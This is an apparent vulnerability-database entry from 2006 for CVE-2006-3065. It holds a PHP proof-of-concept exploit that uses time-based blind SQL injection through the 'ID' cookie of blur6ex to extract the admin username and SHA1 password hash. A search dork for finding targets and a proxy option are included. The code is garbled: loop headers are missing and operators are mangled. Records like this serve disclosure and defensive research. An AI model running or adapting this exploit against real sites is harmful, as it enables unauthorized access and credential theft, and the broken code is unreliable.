{
    "text": "vul_name : blur6ex <= 0.3.462 'ID' blind sql injection ， vul_cve : CVE-2006-3065 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"blur6ex <= 0.3.462 'ID' blind SQL injection / admin credentials disclosurern\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] rn\" ;  ， echo \"site :  ， echo \"dork : \"powered by blur6ex\"rnrn\" ;  ， works regardless of php.ini settings ， echo \"Usage : php \". $ argv [ 0 ] .\" host path OPTIONSrn\" ;  ， echo \"host : target server ( ip/hostname ) rn\" ;  ， echo \"path : path to blur6exrn\" ;  ， echo \"Options : rn\" ;  ， echo \" -T [ prefix ] specify a table prefix different from default ( no prefix ) rn\" ;  ， echo \" -p [ port ]  : specify a port other than 80rn\" ;  ， echo \" -P [ ip : port ]  : specify a proxyrn\" ;  ， echo \"Example : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /blur6ex/ rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /blur6ex/ -Tblur6ex_rn\" ;  ， die ;  ， } ， software site :  ， vulnerable code in engine/shards/blog.php near lines 497-500 :  ， . ， case \"proc_reply\" :  ， / In order to set the permissions of the reply it's necessary to know what the parent is ，  $ permissionid = mysql_query ( \"SELECT permission FROM blog WHERE ID=\" . $ _REQUEST [ 'ID' ]  )  ;  ， . ， 'ID' argument in not sanitized before to be used in a sql query ,  ， injection is blind. ， this code shows how to use time delays through Mysql benchmark (  ) function ,  ， u can use this technique to ask questions of the target system ， and retrieve data from tables ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ， { ，  $ encoded=\"CHAR ( \" ;  ， { ，  $ encoded.=ord (  $ my_string [  $ k ]  )  ;  ， } ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ port=80 ;  ，  $ prefix=\" ;  ，  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ prefix=str_replace ( \"-T\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ，  $ admin=\" ;  ，  $ j=1 ;  ， { ， { ，  $ starttime=time (  )  ;  ， echo \"starttime -> \". $ starttime.\"rn\" ;  ，  $ sql=\"99999 UNION SELECT IF ( ASCII ( SUBSTRING ( username , \". $ j.\" , 1 ) =\". $ i.\" ) & 1 , benchmark ( 50000000 , CHAR ( 0 )  , 0 ) FROM \". $ prefix.\"permissiongroups WHERE PGroup=CHAR ( 97 , 100 , 109 , 105 , 110 ) \" ;  ，  $ sql=str_replace ( \" \" , \"/\" ,  $ sql )  ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ path.\"index.php?shard=blog&action=proc_reply HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : ID=\". $ sql.\" ; rn\" ; /through cookies , log this ，  $ packet.=\"Connection : Closernrn\" ;  ， echo quick_dump (  $ packet ) .\"rn\" ;  ， sendpacketii (  $ packet )  ;  ，  $ endtime=time (  )  ;  ， echo \"endtime -> \". $ endtime.\"rn\" ;  ，  $ difftime= $ endtime - $ starttime ;  ， echo \"difftime -> \". $ difftime.\"rn\" ;  ， /debug ， echo $ html.\"rn\" ;  ， die ( \"Exploit failed.maybe wrong table prefix\" )  ;  ， } ， } ，  $ j+ ;  ， } ，  $ admin=str_replace ( chr ( 0 )  , \" ,  $ admin )  ;  ， echo \"admin -> \". $ admin.\"rn\" ;  ，  $ password=\" ;  ，  $ j=1 ;  ， { ， { ，  $ starttime=time (  )  ;  ， echo \"starttime -> \". $ starttime.\"rn\" ;  ，  $ sql=\"99999 UNION SELECT IF ( ASCII ( SUBSTRING ( password , \". $ j.\" , 1 ) =\". $ i.\" ) & 1 , benchmark ( 50000000 , CHAR ( 0 )  , 0 ) FROM \". $ prefix.\"users WHERE username=\".my_encode (  $ admin )  ;  ，  $ sql=str_replace ( \" \" , \"/\" ,  $ sql )  ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ path.\"index.php?shard=blog&action=proc_reply HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : ID=\". $ sql.\" ; rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， echo quick_dump (  $ packet ) .\"rn\" ;  ， sendpacketii (  $ packet )  ;  ，  $ endtime=time (  )  ;  ， echo \"endtime -> \". $ endtime.\"rn\" ;  ，  $ difftime= $ endtime - $ starttime ;  ， echo \"difftime -> \". $ difftime.\"rn\" ;  ， } ，  $ j+ ;  ， } ， /if you are here. ， echo \"Exploit succeeded.rn\" ;  ， echo \"-r ， n\" ;  ， echo \"admin -> \". $ admin.\"rn\" ;  ， echo \"password ( sha1 ) -> \". $ password.\"rn\" ;  ， echo \"-r ， n\" ;  ， ?> ， original url : ",
    "time": "2006.06.22"
}